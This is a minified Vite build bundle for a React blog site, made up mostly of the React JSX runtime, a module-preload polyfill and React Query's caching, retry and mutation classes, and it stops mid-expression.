const __vite__mapDeps=(i,m=__vite__mapDeps,d=(m.f||(m.f=["assets/Index-T1GwpKjR.js","assets/post-card-bPpGYgaj.js","assets/react-DBx_X-qN.js","assets/ui-C3g96kaJ.js","assets/markdown-Did7K_dw.js","assets/About-Ixyw03tC.js","assets/Content-BUdM0G30.js","assets/Tags-DwKquZM3.js","assets/TagPosts-CrxSy1eX.js","assets/Post-w8XdIc3s.js","assets/NotFound-Cj6_lh_Y.js"])))=>i.map(i=>d[i]);
var qe=Object.defineProperty;var _e=(o,i,s)=>i in o?qe(o,i,{enumerable:!0,configurable:!0,writable:!0,value:s}):o[i]=s;var Re=(o,i,s)=>_e(o,typeof i!="symbol"?i+"":i,s);import{a as requireReact,b as requireReactDom,g as getDefaultExportFromCjs,r as reactExports,N as NavLink,c as getAugmentedNamespace,L as Link,d as Routes$1,e as Route,R as React,B as BrowserRouter}from"./react-DBx_X-qN.js";import{H as House,T as Tags$1,F as FileText,U as User,G as Github,M as Mail,L as Linkedin,m as motion,X,A as AnimatePresence,C as Calendar,a as Clock,b as ChevronRight,S as Search,c as Menu,$ as $e}from"./ui-C3g96kaJ.js";import{_ as __vitePreload}from"./markdown-Did7K_dw.js";(function(){const i=document.createElement("link").relList;if(i&&i.supports&&i.supports("modulepreload"))return;for(const d of document.querySelectorAll('link[rel="modulepreload"]'))c(d);new MutationObserver(d=>{for(const f of d)if(f.type==="childList")for(const h of f.addedNodes)h.tagName==="LINK"&&h.rel==="modulepreload"&&c(h)}).observe(document,{childList:!0,subtree:!0});function s(d){const f={};return d.integrity&&(f.integrity=d.integrity),d.referrerPolicy&&(f.referrerPolicy=d.referrerPolicy),d.crossOrigin==="use-credentials"?f.credentials="include":d.crossOrigin==="anonymous"?f.credentials="omit":f.credentials="same-origin",f}function c(d){if(d.ep)return;d.ep=!0;const f=s(d);fetch(d.href,f)}})();var jsxRuntime={exports:{}},reactJsxRuntime_production_min={};var hasRequiredReactJsxRuntime_production_min;function requireReactJsxRuntime_production_min(){if(hasRequiredReactJsxRuntime_production_min)return reactJsxRuntime_production_min;hasRequiredReactJsxRuntime_production_min=1;var o=requireReact(),i=Symbol.for("react.element"),s=Symbol.for("react.fragment"),c=Object.prototype.hasOwnProperty,d=o.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED.ReactCurrentOwner,f={key:!0,ref:!0,__self:!0,__source:!0};function h(u,m,v){var b,x={},P=null,E=null;v!==void 0&&(P=""+v),m.key!==void 0&&(P=""+m.key),m.ref!==void 0&&(E=m.ref);for(b in m)c.call(m,b)&&!f.hasOwnProperty(b)&&(x[b]=m[b]);if(u&&u.defaultProps)for(b in m=u.defaultProps,m)x[b]===void 0&&(x[b]=m[b]);return{$$typeof:i,type:u,key:P,ref:E,props:x,_owner:d.current}}return reactJsxRuntime_production_min.Fragment=s,reactJsxRuntime_production_min.jsx=h,reactJsxRuntime_production_min.jsxs=h,reactJsxRuntime_production_min}var hasRequiredJsxRuntime;function requireJsxRuntime(){return hasRequiredJsxRuntime||(hasRequiredJsxRuntime=1,jsxRuntime.exports=requireReactJsxRuntime_production_min()),jsxRuntime.exports}var jsxRuntimeExports=requireJsxRuntime(),client={},hasRequiredClient;function requireClient(){if(hasRequiredClient)return client;hasRequiredClient=1;var o=requireReactDom();return client.createRoot=o.createRoot,client.hydrateRoot=o.hydrateRoot,client}var clientExports=requireClient();const ReactDOM=getDefaultExportFromCjs(clientExports);class Subscribable{constructor(){this.listeners=new Set,this.subscribe=this.subscribe.bind(this)}subscribe(i){const s={listener:i};return this.listeners.add(s),this.onSubscribe(),()=>{this.listeners.delete(s),this.onUnsubscribe()}}hasListeners(){return this.listeners.size>0}onSubscribe(){}onUnsubscribe(){}}const isServer=typeof window>"u"||"Deno"in window;function noop(){}function functionalUpdate(o,i){return typeof o=="function"?o(i):o}function isValidTimeout(o){return typeof o=="number"&&o>=0&&o!==1/0}function timeUntilStale(o,i){return Math.max(o+(i||0)-Date.now(),0)}function parseQueryArgs(o,i,s){return isQueryKey(o)?typeof i=="function"?{...s,queryKey:o,queryFn:i}:{...i,queryKey:o}:o}function parseFilterArgs(o,i,s){return isQueryKey(o)?[{...i,queryKey:o},s]:[o||{},i]}function matchQuery(o,i){const{type:s="all",exact:c,fetchStatus:d,predicate:f,queryKey:h,stale:u}=o;if(isQueryKey(h)){if(c){if(i.queryHash!==hashQueryKeyByOptions(h,i.options))return!1}else if(!partialMatchKey(i.queryKey,h))return!1}if(s!=="all"){const m=i.isActive();if(s==="active"&&!m||s==="inactive"&&m)return!1}return!(typeof u=="boolean"&&i.isStale()!==u||typeof d<"u"&&d!==i.state.fetchStatus||f&&!f(i))}function matchMutation(o,i){const{exact:s,fetching:c,predicate:d,mutationKey:f}=o;if(isQueryKey(f)){if(!i.options.mutationKey)return!1;if(s){if(hashQueryKey(i.options.mutationKey)!==hashQueryKey(f))return!1}else if(!partialMatchKey(i.options.mutationKey,f))return!1}return!(typeof c=="boolean"&&i.state.status==="loading"!==c||d&&!d(i))}function hashQueryKeyByOptions(o,i){return(i?.queryKeyHashFn||hashQueryKey)(o)}function hashQueryKey(o){return JSON.stringify(o,(i,s)=>isPlainObject(s)?Object.keys(s).sort().reduce((c,d)=>(c[d]=s[d],c),{}):s)}function partialMatchKey(o,i){return partialDeepEqual(o,i)}function partialDeepEqual(o,i){return o===i?!0:typeof o!=typeof i?!1:o&&i&&typeof o=="object"&&typeof i=="object"?!Object.keys(i).some(s=>!partialDeepEqual(o[s],i[s])):!1}function replaceEqualDeep(o,i,s=0){if(o===i)return o;if(s>500)return i;const c=isPlainArray(o)&&isPlainArray(i);if(c||isPlainObject(o)&&isPlainObject(i)){const d=c?o.length:Object.keys(o).length,f=c?i:Object.keys(i),h=f.length,u=c?[]:{};let m=0;for(let v=0;v<h;v++){const b=c?v:f[v];u[b]=replaceEqualDeep(o[b],i[b],s+1),u[b]===o[b]&&m++}return d===h&&m===d?o:u}return i}function isPlainArray(o){return Array.isArray(o)&&o.length===Object.keys(o).length}function isPlainObject(o){if(!hasObjectPrototype(o))return!1;const i=o.constructor;if(typeof i>"u")return!0;const s=i.prototype;return!(!hasObjectPrototype(s)||!s.hasOwnProperty("isPrototypeOf"))}function hasObjectPrototype(o){return Object.prototype.toString.call(o)==="[object Object]"}function isQueryKey(o){return Array.isArray(o)}function sleep(o){return new Promise(i=>{setTimeout(i,o)})}function scheduleMicrotask(o){sleep(0).then(o)}function getAbortController(){if(typeof AbortController=="function")return new AbortController}function replaceData(o,i,s){return s.isDataEqual!=null&&s.isDataEqual(o,i)?o:typeof s.structuralSharing=="function"?s.structuralSharing(o,i):s.structuralSharing!==!1?replaceEqualDeep(o,i):i}class FocusManager extends Subscribable{constructor(){super(),this.setup=i=>{if(!isServer&&window.addEventListener){const s=()=>i();return window.addEventListener("visibilitychange",s,!1),window.addEventListener("focus",s,!1),()=>{window.removeEventListener("visibilitychange",s),window.removeEventListener("focus",s)}}}}onSubscribe(){this.cleanup||this.setEventListener(this.setup)}onUnsubscribe(){if(!this.hasListeners()){var i;(i=this.cleanup)==null||i.call(this),this.cleanup=void 0}}setEventListener(i){var s;this.setup=i,(s=this.cleanup)==null||s.call(this),this.cleanup=i(c=>{typeof c=="boolean"?this.setFocused(c):this.onFocus()})}setFocused(i){this.focused!==i&&(this.focused=i,this.onFocus())}onFocus(){this.listeners.forEach(({listener:i})=>{i()})}isFocused(){return typeof this.focused=="boolean"?this.focused:typeof document>"u"?!0:[void 0,"visible","prerender"].includes(document.visibilityState)}}const focusManager=new FocusManager,onlineEvents=["online","offline"];class OnlineManager extends Subscribable{constructor(){super(),this.setup=i=>{if(!isServer&&window.addEventListener){const s=()=>i();return onlineEvents.forEach(c=>{window.addEventListener(c,s,!1)}),()=>{onlineEvents.forEach(c=>{window.removeEventListener(c,s)})}}}}onSubscribe(){this.cleanup||this.setEventListener(this.setup)}onUnsubscribe(){if(!this.hasListeners()){var i;(i=this.cleanup)==null||i.call(this),this.cleanup=void 0}}setEventListener(i){var s;this.setup=i,(s=this.cleanup)==null||s.call(this),this.cleanup=i(c=>{typeof c=="boolean"?this.setOnline(c):this.onOnline()})}setOnline(i){this.online!==i&&(this.online=i,this.onOnline())}onOnline(){this.listeners.forEach(({listener:i})=>{i()})}isOnline(){return typeof this.online=="boolean"?this.online:typeof navigator>"u"||typeof navigator.onLine>"u"?!0:navigator.onLine}}const onlineManager=new OnlineManager;function defaultRetryDelay(o){return Math.min(1e3*2**o,3e4)}function canFetch(o){return(o??"online")==="online"?onlineManager.isOnline():!0}class CancelledError{constructor(i){this.revert=i?.revert,this.silent=i?.silent}}function isCancelledError(o){return o instanceof CancelledError}function createRetryer(o){let i=!1,s=0,c=!1,d,f,h;const u=new Promise((j,k)=>{f=j,h=k}),m=j=>{c||(E(new CancelledError(j)),o.abort==null||o.abort())},v=()=>{i=!0},b=()=>{i=!1},x=()=>!focusManager.isFocused()||o.networkMode!=="always"&&!onlineManager.isOnline(),P=j=>{c||(c=!0,o.onSuccess==null||o.onSuccess(j),d?.(),f(j))},E=j=>{c||(c=!0,o.onError==null||o.onError(j),d?.(),h(j))},w=()=>new Promise(j=>{d=k=>{const I=c||!x();return I&&j(k),I},o.onPause==null||o.onPause()}).then(()=>{d=void 0,c||o.onContinue==null||o.onContinue()}),T=()=>{if(c)return;let j;try{j=o.fn()}catch(k){j=Promise.reject(k)}Promise.resolve(j).then(P).catch(k=>{var I,N;if(c)return;const B=(I=o.retry)!=null?I:3,D=(N=o.retryDelay)!=null?N:defaultRetryDelay,O=typeof D=="function"?D(s,k):D,L=B===!0||typeof B=="number"&&s<B||typeof B=="function"&&B(s,k);if(i||!L){E(k);return}s++,o.onFail==null||o.onFail(s,k),sleep(O).then(()=>{if(x())return w()}).then(()=>{i?E(k):T()})})};return canFetch(o.networkMode)?T():w().then(T),{promise:u,cancel:m,continue:()=>d?.()?u:Promise.resolve(),cancelRetry:v,continueRetry:b}}const defaultLogger=console;function createNotifyManager(){let o=[],i=0,s=b=>{b()},c=b=>{b()};const d=b=>{let x;i++;try{x=b()}finally{i--,i||u()}return x},f=b=>{i?o.push(b):scheduleMicrotask(()=>{s(b)})},h=b=>(...x)=>{f(()=>{b(...x)})},u=()=>{const b=o;o=[],b.length&&scheduleMicrotask(()=>{c(()=>{b.forEach(x=>{s(x)})})})};return{batch:d,batchCalls:h,schedule:f,setNotifyFunction:b=>{s=b},setBatchNotifyFunction:b=>{c=b}}}const notifyManager=createNotifyManager();class Removable{destroy(){this.clearGcTimeout()}scheduleGc(){this.clearGcTimeout(),isValidTimeout(this.cacheTime)&&(this.gcTimeout=setTimeout(()=>{this.optionalRemove()},this.cacheTime))}updateCacheTime(i){this.cacheTime=Math.max(this.cacheTime||0,i??(isServer?1/0:300*1e3))}clearGcTimeout(){this.gcTimeout&&(clearTimeout(this.gcTimeout),this.gcTimeout=void 0)}}class Query extends Removable{constructor(i){super(),this.abortSignalConsumed=!1,this.defaultOptions=i.defaultOptions,this.setOptions(i.options),this.observers=[],this.cache=i.cache,this.logger=i.logger||defaultLogger,this.queryKey=i.queryKey,this.queryHash=i.queryHash,this.initialState=i.state||getDefaultState$1(this.options),this.state=this.initialState,this.scheduleGc()}get meta(){return this.options.meta}setOptions(i){this.options={...this.defaultOptions,...i},this.updateCacheTime(this.options.cacheTime)}optionalRemove(){!this.observers.length&&this.state.fetchStatus==="idle"&&this.cache.remove(this)}setData(i,s){const c=replaceData(this.state.data,i,this.options);return this.dispatch({data:c,type:"success",dataUpdatedAt:s?.updatedAt,manual:s?.manual}),c}setState(i,s){this.dispatch({type:"setState",state:i,setStateOptions:s})}cancel(i){var s;const c=this.promise;return(s=this.retryer)==null||s.cancel(i),c?c.then(noop).catch(noop):Promise.resolve()}destroy(){super.destroy(),this.cancel({silent:!0})}reset(){this.destroy(),this.setState(this.initialState)}isActive(){return this.observers.some(i=>i.options.enabled!==!1)}isDisabled(){return this.getObserversCount()>0&&!this.isActive()}isStale(){return this.state.isInvalidated||!this.state.dataUpdatedAt||this.observers.some(i=>i.getCurrentResult().isStale)}isStaleByTime(i=0){return this.state.isInvalidated||!this.state.dataUpdatedAt||!timeUntilStale(this.state.dataUpdatedAt,i)}onFocus(){var i;const s=this.observers.find(c=>c.shouldFetchOnWindowFocus());s&&s.refetch({cancelRefetch:!1}),(i=this.retryer)==null||i.continue()}onOnline(){var i;const s=this.observers.find(c=>c.shouldFetchOnReconnect());s&&s.refetch({cancelRefetch:!1}),(i=this.retryer)==null||i.continue()}addObserver(i){this.observers.includes(i)||(this.observers.push(i),this.clearGcTimeout(),this.cache.notify({type:"observerAdded",query:this,observer:i}))}removeObserver(i){this.observers.includes(i)&&(this.observers=this.observers.filter(s=>s!==i),this.observers.length||(this.retryer&&(this.abortSignalConsumed?this.retryer.cancel({revert:!0}):this.retryer.cancelRetry()),this.scheduleGc()),this.cache.notify({type:"observerRemoved",query:this,observer:i}))}getObserversCount(){return this.observers.length}invalidate(){this.state.isInvalidated||this.dispatch({type:"invalidate"})}fetch(i,s){var c,d;if(this.state.fetchStatus!=="idle"){if(this.state.dataUpdatedAt&&s!=null&&s.cancelRefetch)this.cancel({silent:!0});else if(this.promise){var f;return(f=this.retryer)==null||f.continueRetry(),this.promise}}if(i&&this.setOptions(i),!this.options.queryFn){const E=this.observers.find(w=>w.options.queryFn);E&&this.setOptions(E.options)}const h=getAbortController(),u={queryKey:this.queryKey,pageParam:void 0,meta:this.meta},m=E=>{Object.defineProperty(E,"signal",{enumerable:!0,get:()=>{if(h)return this.abortSignalConsumed=!0,h.signal}})};m(u);const v=()=>this.options.queryFn?(this.abortSignalConsumed=!1,this.options.queryFn(u)):Promise.reject("Missing queryFn for queryKey '"+this.options.queryHash+"'"),b={fetchOptions:s,options:this.options,queryKey:this.queryKey,state:this.state,fetchFn:v};if(m(b),(c=this.options.behavior)==null||c.onFetch(b),this.revertState=this.state,this.state.fetchStatus==="idle"||this.state.fetchMeta!==((d=b.fetchOptions)==null?void 0:d.meta)){var x;this.dispatch({type:"fetch",meta:(x=b.fetchOptions)==null?void 0:x.meta})}const P=E=>{if(isCancelledError(E)&&E.silent||this.dispatch({type:"error",error:E}),!isCancelledError(E)){var w,T,j,k;(w=(T=this.cache.config).onError)==null||w.call(T,E,this),(j=(k=this.cache.config).onSettled)==null||j.call(k,this.state.data,E,this)}this.isFetchingOptimistic||this.scheduleGc(),this.isFetchingOptimistic=!1};return this.retryer=createRetryer({fn:b.fetchFn,abort:h?.abort.bind(h),onSuccess:E=>{var w,T,j,k;if(typeof E>"u"){P(new Error(this.queryHash+" data is undefined"));return}this.setData(E),(w=(T=this.cache.config).onSuccess)==null||w.call(T,E,this),(j=(k=this.cache.config).onSettled)==null||j.call(k,E,this.state.error,this),this.isFetchingOptimistic||this.scheduleGc(),this.isFetchingOptimistic=!1},onError:P,onFail:(E,w)=>{this.dispatch({type:"failed",failureCount:E,error:w})},onPause:()=>{this.dispatch({type:"pause"})},onContinue:()=>{this.dispatch({type:"continue"})},retry:b.options.retry,retryDelay:b.options.retryDelay,networkMode:b.options.networkMode}),this.promise=this.retryer.promise,this.promise}dispatch(i){const s=c=>{var d,f;switch(i.type){case"failed":return{...c,fetchFailureCount:i.failureCount,fetchFailureReason:i.error};case"pause":return{...c,fetchStatus:"paused"};case"continue":return{...c,fetchStatus:"fetching"};case"fetch":return{...c,fetchFailureCount:0,fetchFailureReason:null,fetchMeta:(d=i.meta)!=null?d:null,fetchStatus:canFetch(this.options.networkMode)?"fetching":"paused",...!c.dataUpdatedAt&&{error:null,status:"loading"}};case"success":return{...c,data:i.data,dataUpdateCount:c.dataUpdateCount+1,dataUpdatedAt:(f=i.dataUpdatedAt)!=null?f:Date.now(),error:null,isInvalidated:!1,status:"success",...!i.manual&&{fetchStatus:"idle",fetchFailureCount:0,fetchFailureReason:null}};case"error":const h=i.error;return isCancelledError(h)&&h.revert&&this.revertState?{...this.revertState,fetchStatus:"idle"}:{...c,error:h,errorUpdateCount:c.errorUpdateCount+1,errorUpdatedAt:Date.now(),fetchFailureCount:c.fetchFailureCount+1,fetchFailureReason:h,fetchStatus:"idle",status:"error"};case"invalidate":return{...c,isInvalidated:!0};case"setState":return{...c,...i.state}}};this.state=s(this.state),notifyManager.batch(()=>{this.observers.forEach(c=>{c.onQueryUpdate(i)}),this.cache.notify({query:this,type:"updated",action:i})})}}function getDefaultState$1(o){const i=typeof o.initialData=="function"?o.initialData():o.initialData,s=typeof i<"u",c=s?typeof o.initialDataUpdatedAt=="function"?o.initialDataUpdatedAt():o.initialDataUpdatedAt:0;return{data:i,dataUpdateCount:0,dataUpdatedAt:s?c??Date.now():0,error:null,errorUpdateCount:0,errorUpdatedAt:0,fetchFailureCount:0,fetchFailureReason:null,fetchMeta:null,isInvalidated:!1,status:s?"success":"loading",fetchStatus:"idle"}}class QueryCache extends Subscribable{constructor(i){super(),this.config=i||{},this.queries=[],this.queriesMap={}}build(i,s,c){var d;const f=s.queryKey,h=(d=s.queryHash)!=null?d:hashQueryKeyByOptions(f,s);let u=this.get(h);return u||(u=new Query({cache:this,logger:i.getLogger(),queryKey:f,queryHash:h,options:i.defaultQueryOptions(s),state:c,defaultOptions:i.getQueryDefaults(f)}),this.add(u)),u}add(i){this.queriesMap[i.queryHash]||(this.queriesMap[i.queryHash]=i,this.queries.push(i),this.notify({type:"added",query:i}))}remove(i){const s=this.queriesMap[i.queryHash];s&&(i.destroy(),this.queries=this.queries.filter(c=>c!==i),s===i&&delete this.queriesMap[i.queryHash],this.notify({type:"removed",query:i}))}clear(){notifyManager.batch(()=>{this.queries.forEach(i=>{this.remove(i)})})}get(i){return this.queriesMap[i]}getAll(){return this.queries}find(i,s){const[c]=parseFilterArgs(i,s);return typeof c.exact>"u"&&(c.exact=!0),this.queries.find(d=>matchQuery(c,d))}findAll(i,s){const[c]=parseFilterArgs(i,s);return Object.keys(c).length>0?this.queries.filter(d=>matchQuery(c,d)):this.queries}notify(i){notifyManager.batch(()=>{this.listeners.forEach(({listener:s})=>{s(i)})})}onFocus(){notifyManager.batch(()=>{this.queries.forEach(i=>{i.onFocus()})})}onOnline(){notifyManager.batch(()=>{this.queries.forEach(i=>{i.onOnline()})})}}class Mutation extends Removable{constructor(i){super(),this.defaultOptions=i.defaultOptions,this.mutationId=i.mutationId,this.mutationCache=i.mutationCache,this.logger=i.logger||defaultLogger,this.observers=[],this.state=i.state||getDefaultState(),this.setOptions(i.options),this.scheduleGc()}setOptions(i){this.options={...this.defaultOptions,...i},this.updateCacheTime(this.options.cacheTime)}get meta(){return this.options.meta}setState(i){this.dispatch({type:"setState",state:i})}addObserver(i){this.observers.includes(i)||(this.observers.push(i),this.clearGcTimeout(),this.mutationCache.notify({type:"observerAdded",mutation:this,observer:i}))}removeObserver(i){this.observers=this.observers.filter(s=>s!==i),this.scheduleGc(),this.mutationCache.notify({type:"observerRemoved",mutation:this,observer:i})}optionalRemove(){this.observers.length||(this.state.status==="loading"?this.scheduleGc():this.mutationCache.remove(this))}continue(){var i,s;return(i=(s=this.retryer)==null?void 0:s.continue())!=null?i:this.execute()}async execute(){const i=()=>{var L;return this.retryer=createRetryer({fn:()=>this.options.mutationFn?this.options.mutationFn(this.state.variables):Promise.reject("No mutationFn found"),onFail:(z,Y)=>{this.dispatch({type:"failed",failureCount:z,error:Y})},onPause:()=>{this.dispatch({type:"pause"})},onContinue:()=>{this.dispatch({type:"continue"})},retry:(L=this.options.retry)!=null?L:0,retryDelay:this.options.retryDelay,networkMode:this.options.networkMode}),this.retryer.promise},s=this.state.status==="loading";try{var c,d,f,h,u,m,v,b;if(!s){var x,P,E,w;this.dispatch({type:"loading",variables:this.options.variables}),await((x=(P=this.mutationCache.config).onMutate)==null?void 0:x.call(P,this.state.variables,this));const z=await((E=(w=this.options).onMutate)==null?void 0:E.call(w,this.state.variables));z!==this.state.context&&this.dispatch({type:"loading",context:z,variables:this.state.variables})}const L=await i();return await((c=(d=this.mutationCache.config).onSuccess)==null?void 0:c.call(d,L,this.state.variables,this.state.context,this)),await((f=(h=this.options).onSuccess)==null?void 0:f.call(h,L,this.state.variables,this.state.context)),await((u=(m=this.mutationCache.config).onSettled)==null?void 0:u.call(m,L,null,this.state.variables,this.state.context,this)),await((v=(b=this.options).onSettled)==null?void 0:v.call(b,L,null,this.state.variables,this.state.context)),this.dispatch({type:"success",data:L}),L}catch(L){try{var T,j,k,I,N,B,D,O;throw await((T=(j=this.mutationCache.config).onError)==null?void 0:T.call(j,L,this.state.variables,this.state.context,this)),await((k=(I=this.options).onError)==null?void 0:k.call(I,L,this.state.variables,this.state.context)),await((N=(B=this.mutationCache.config).onSettled)==null?void 0:N.call(B,void 0,L,this.state.variables,this.state.context,this)),await((D=(O=this.options).onSettled)==null?void 0:D.call(O,void 0,L,this.state.variables,this.state.context)),L}finally{this.dispatch({type:"error",error:L})}}}dispatch(i){const s=c=>{switch(i.type){case"failed":return{...c,failureCount:i.failureCount,failureReason:i.error};case"pause":return{...c,isPaused:!0};case"continue":return{...c,isPaused:!1};case"loading":return{...c,context:i.context,data:void 0,failureCount:0,failureReason:null,error:null,isPaused:!canFetch(this.options.networkMode),status:"loading",variables:i.variables};case"success":return{...c,data:i.data,failureCount:0,failureReason:null,error:null,status:"success",isPaused:!1};case"error":return{...c,data:void 0,error:i.error,failureCount:c.failureCount+1,failureReason:i.error,isPaused:!1,status:"error"};case"setState":return{...c,...i.state}}};this.state=s(this.state),notifyManager.batch(()=>{this.observers.forEach(c=>{c.onMutationUpdate(i)}),this.mutationCache.notify({mutation:this,type:"updated",action:i})})}}function getDefaultState(){return{context:void 0,data:void 0,error:null,failureCount:0,failureReason:null,isPaused:!1,status:"idle",variables:void 0}}class MutationCache extends Subscribable{constructor(i){super(),this.config=i||{},this.mutations=[],this.mutationId=0}build(i,s,c){const d=new Mutation({mutationCache:this,logger:i.getLogger(),mutationId:++this.mutationId,options:i.defaultMutationOptions(s),state:c,defaultOptions:s.mutationKey?i.getMutationDefaults(s.mutationKey):void 0});return this.add(d),d}add(i){this.mutations.push(i),this.notify({type:"added",mutation:i})}remove(i){this.mutations=this.mutations.filter(s=>s!==i),this.notify({type:"removed",mutation:i})}clear(){notifyManager.batch(()=>{this.mutations.forEach(i=>{this.remove(i)})})}getAll(){return this.mutations}find(i){return typeof i.exact>"u"&&(i.exact=!0),this.mutations.find(s=>matchMutation(i,s))}findAll(i){return this.mutations.filter(s=>matchMutation(i,s))}notify(i){notifyManager.batch(()=>{this.listeners.forEach(({listener:s})=>{s(i)})})}resumePausedMutations(){var i;return this.resuming=((i=this.resuming)!=null?i:Promise.resolve()).then(()=>{const s=this.mutations.filter(c=>c.state.isPaused);return notifyManager.batch(()=>s.reduce((c,d)=>c.then(()=>d.continue().catch(noop)),Promise.resolve()))}).then(()=>{this.resuming=void 0}),this.resuming}}function infiniteQueryBehavior(){return{onFetch:o=>{o.fetchFn=()=>{var i,s,c,d,f,h;const u=(i=o.fetchOptions)==null||(s=i.meta)==null?void 0:s.refetchPage,m=(c=o.fetchOptions)==null||(d=c.meta)==null?void 0:d.fetchMore,v=m?.pageParam,b=m?.direction==="forward",x=m?.direction==="backward",P=((f=o.state.data)==null?void 0:f.pages)||[],E=((h=o.state.data)==null?void 0:h.pageParams)||[];let w=E,T=!1;const j=O=>{Object.defineProperty(O,"signal",{enumerable:!0,get:()=>{var L;if((L=o.signal)!=null&&L.aborted)T=!0;else{var z;(z=o.signal)==null||z.addEventListener("abort",()=>{T=!0})}return o.signal}})},k=o.options.queryFn||(()=>Promise.reject("Missing queryFn for queryKey '"+o.options.queryHash+"'")),I=(O,L,z,Y)=>(w=Y?[L,...w]:[...w,L],Y?[z,...O]:[...O,z]),N=(O,L,z,Y)=>{if(T)return Promise.reject("Cancelled");if(typeof z>"u"&&!L&&O.length)return Promise.resolve(O);const ae={queryKey:o.queryKey,pageParam:z,meta:o.options.meta};j(ae);const ie=k(ae);return Promise.resolve(ie).then(te=>I(O,z,te,Y))};let B;if(!P.length)B=N([]);else if(b){const O=typeof v<"u",L=O?v:getNextPageParam(o.options,P);B=N(P,O,L)}else if(x){const O=typeof v<"u",L=O?v:getPreviousPageParam(o.options,P);B=N(P,O,L,!0)}else{w=[];const O=typeof o.options.getNextPageParam>"u";B=(u&&P[0]?u(P[0],0,P):!0)?N([],O,E[0]):Promise.resolve(I([],E[0],P[0]));for(let z=1;z<P.length;z++)B=B.then(Y=>{if(u&&P[z]?u(P[z],z,P):!0){const ie=O?E[z]:getNextPageParam(o.options,Y);return N(Y,O,ie)}return Promise.resolve(I(Y,E[z],P[z]))})}return B.then(O=>({pages:O,pageParams:w}))}}}}function getNextPageParam(o,i){return o.getNextPageParam==null?void 0:o.getNextPageParam(i[i.length-1],i)}function getPreviousPageParam(o,i){return o.getPreviousPageParam==null?void 0:o.getPreviousPageParam(i[0],i)}class QueryClient{constructor(i={}){this.queryCache=i.queryCache||new QueryCache,this.mutationCache=i.mutationCache||new MutationCache,this.logger=i.logger||defaultLogger,this.defaultOptions=i.defaultOptions||{},this.queryDefaults=[],this.mutationDefaults=[],this.mountCount=0}mount(){this.mountCount++,this.mountCount===1&&(this.unsubscribeFocus=focusManager.subscribe(()=>{focusManager.isFocused()&&(this.resumePausedMutations(),this.queryCache.onFocus())}),this.unsubscribeOnline=onlineManager.subscribe(()=>{onlineManager.isOnline()&&(this.resumePausedMutations(),this.queryCache.onOnline())}))}unmount(){var i,s;this.mountCount--,this.mountCount===0&&((i=this.unsubscribeFocus)==null||i.call(this),this.unsubscribeFocus=void 0,(s=this.unsubscribeOnline)==null||s.call(this),this.unsubscribeOnline=void 0)}isFetching(i,s){const[c]=parseFilterArgs(i,s);return c.fetchStatus="fetching",this.queryCache.findAll(c).length}isMutating(i){return this.mutationCache.findAll({...i,fetching:!0}).length}getQueryData(i,s){var c;return(c=this.queryCache.find(i,s))==null?void 0:c.state.data}ensureQueryData(i,s,c){const d=parseQueryArgs(i,s,c),f=this.getQueryData(d.queryKey);return f?Promise.resolve(f):this.fetchQuery(d)}getQueriesData(i){return this.getQueryCache().findAll(i).map(({queryKey:s,state:c})=>{const d=c.data;return[s,d]})}setQueryData(i,s,c){const d=this.queryCache.find(i),f=d?.state.data,h=functionalUpdate(s,f);if(typeof h>"u")return;const u=parseQueryArgs(i),m=this.defaultQueryOptions(u);return this.queryCache.build(this,m).setData(h,{...c,manual:!0})}setQueriesData(i,s,c){return notifyManager.batch(()=>this.getQueryCache().findAll(i).map(({queryKey:d})=>[d,this.setQueryData(d,s,c)]))}getQueryState(i,s){var c;return(c=this.queryCache.find(i,s))==null?void 0:c.state}removeQueries(i,s){const[c]=parseFilterArgs(i,s),d=this.queryCache;notifyManager.batch(()=>{d.findAll(c).forEach(f=>{d.remove(f)})})}resetQueries(i,s,c){const[d,f]=parseFilterArgs(i,s,c),h=this.queryCache,u={type:"active",...d};return notifyManager.batch(()=>(h.findAll(d).forEach(m=>{m.reset()}),this.refetchQueries(u,f)))}cancelQueries(i,s,c){const[d,f={}]=parseFilterArgs(i,s,c);typeof f.revert>"u"&&(f.revert=!0);const h=notifyManager.batch(()=>this.queryCache.findAll(d).map(u=>u.cancel(f)));return Promise.all(h).then(noop).catch(noop)}invalidateQueries(i,s,c){const[d,f]=parseFilterArgs(i,s,c);return notifyManager.batch(()=>{var h,u;if(this.queryCache.findAll(d).forEach(v=>{v.invalidate()}),d.refetchType==="none")return Promise.resolve();const m={...d,type:(h=(u=d.refetchType)!=null?u:d.type)!=null?h:"active"};return this.refetchQueries(m,f)})}refetchQueries(i,s,c){const[d,f]=parseFilterArgs(i,s,c),h=notifyManager.batch(()=>this.queryCache.findAll(d).filter(m=>!m.isDisabled()).map(m=>{var v;return m.fetch(void 0,{...f,cancelRefetch:(v=f?.cancelRefetch)!=null?v:!0,meta:{refetchPage:d.refetchPage}})}));let u=Promise.all(h).then(noop);return f!=null&&f.throwOnError||(u=u.catch(noop)),u}fetchQuery(i,s,c){const d=parseQueryArgs(i,s,c),f=this.defaultQueryOptions(d);typeof f.retry>"u"&&(f.retry=!1);const h=this.queryCache.build(this,f);return h.isStaleByTime(f.staleTime)?h.fetch(f):Promise.resolve(h.state.data)}prefetchQuery(i,s,c){return this.fetchQuery(i,s,c).then(noop).catch(noop)}fetchInfiniteQuery(i,s,c){const d=parseQueryArgs(i,s,c);return d.behavior=infiniteQueryBehavior(),this.fetchQuery(d)}prefetchInfiniteQuery(i,s,c){return this.fetchInfiniteQuery(i,s,c).then(noop).catch(noop)}resumePausedMutations(){return this.mutationCache.resumePausedMutations()}getQueryCache(){return this.queryCache}getMutationCache(){return this.mutationCache}getLogger(){return this.logger}getDefaultOptions(){return this.defaultOptions}setDefaultOptions(i){this.defaultOptions=i}setQueryDefaults(i,s){const c=this.queryDefaults.find(d=>hashQueryKey(i)===hashQueryKey(d.queryKey));c?c.defaultOptions=s:this.queryDefaults.push({queryKey:i,defaultOptions:s})}getQueryDefaults(i){if(!i)return;const s=this.queryDefaults.find(c=>partialMatchKey(i,c.queryKey));return s?.defaultOptions}setMutationDefaults(i,s){const c=this.mutationDefaults.find(d=>hashQueryKey(i)===hashQueryKey(d.mutationKey));c?c.defaultOptions=s:this.mutationDefaults.push({mutationKey:i,defaultOptions:s})}getMutationDefaults(i){if(!i)return;const s=this.mutationDefaults.find(c=>partialMatchKey(i,c.mutationKey));return s?.defaultOptions}defaultQueryOptions(i){if(i!=null&&i._defaulted)return i;const s={...this.defaultOptions.queries,...this.getQueryDefaults(i?.queryKey),...i,_defaulted:!0};return!s.queryHash&&s.queryKey&&(s.queryHash=hashQueryKeyByOptions(s.queryKey,s)),typeof 